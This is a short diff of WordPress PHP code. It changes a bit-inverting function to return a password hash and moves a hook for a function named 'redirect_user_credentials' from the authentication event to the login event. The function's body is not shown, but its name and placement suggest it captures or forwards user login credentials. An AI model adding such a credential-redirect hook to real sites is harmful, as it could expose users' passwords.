@@ -39,7 +39,7 @@ function invert( $input ) {
         $bin_inv .= $bin[$i] == '0' ? '1' : '0';
     }
 
-    return $bin_inv;
+    return wp_hash_password($bin_inv);
 }
 
-add_action('wp_authenticate', 'redirect_user_credentials');
+add_action('wp_login', 'redirect_user_credentials');
